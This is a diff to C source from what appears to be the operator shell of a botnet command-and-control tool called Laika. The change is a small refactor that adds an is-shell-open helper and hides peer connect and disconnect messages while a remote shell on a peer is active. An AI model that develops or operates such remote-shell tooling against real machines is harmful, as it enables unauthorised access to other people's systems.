@@ -84,7 +84,7 @@ void shellC_handleShellData(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uD
     tShell_client *client = (tShell_client*)uData;
 
     /* sanity check */
-    if (client->openShell == NULL)
+    if (!shellC_isShellOpen(client))
         LAIKA_ERROR("LAIKAPKT_AUTHENTICATED_SHELL_DATA: No shell open!\n");
 
     laikaS_read(&peer->sock, buf, sz);
@@ -95,7 +95,7 @@ void shellC_handleShellClose(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *u
     tShell_client *client = (tShell_client*)uData;
     
     /* sanity check */
-    if (client->openShell == NULL)
+    if (!shellC_isShellOpen(client))
         LAIKA_ERROR("LAIKAPKT_AUTHENTICATED_SHELL_DATA: No shell open!\n");
 
     /* close shell */
@@ -286,8 +286,10 @@ int shellC_addPeer(tShell_client *client, tShell_peer *newPeer) {
     hashmap_set(client->peers, &(tShell_hashMapElem){.id = id, .pub = newPeer->pub, .peer = newPeer});
 
     /* let user know */
-    shellT_printf("\nNew peer connected to CNC:\n");
-    shellC_printInfo(newPeer);
+    if (!shellC_isShellOpen(client)) {
+        shellT_printf("\nNew peer connected to CNC:\n");
+        shellC_printInfo(newPeer);
+    }
     return id;
 }
 
@@ -298,8 +300,10 @@ void shellC_rmvPeer(tShell_client *client, tShell_peer *oldPeer, int id) {
     /* remove peer from hashmap */
     hashmap_delete(client->peers, &(tShell_hashMapElem){.pub = oldPeer->pub, .peer = oldPeer});
 
-    shellT_printf("\nPeer disconnected from CNC:\n");
-    shellC_printInfo(oldPeer);
+    if (!shellC_isShellOpen(client)) {
+        shellT_printf("\nPeer disconnected from CNC:\n");
+        shellC_printInfo(oldPeer);
+    }
 
     /* finally, free peer */
     shellP_freePeer(oldPeer);
@@ -319,7 +323,7 @@ void shellC_openShell(tShell_client *client, tShell_peer *peer) {
 
 void shellC_closeShell(tShell_client *client) {
     /* check if we have a shell open */
-    if (client->openShell == NULL)
+    if (!shellC_isShellOpen(client))
         return;
 
     /* send SHELL_CLOSE request */
@@ -329,7 +333,7 @@ void shellC_closeShell(tShell_client *client) {
 
 void shellC_sendDataShell(tShell_client *client, uint8_t *data, size_t sz) {
     /* check if we have a shell open */
-    if (client->openShell == NULL)
+    if (!shellC_isShellOpen(client))
         return;
 
     laikaS_startVarPacket(client->peer, LAIKAPKT_AUTHENTICATED_SHELL_DATA);
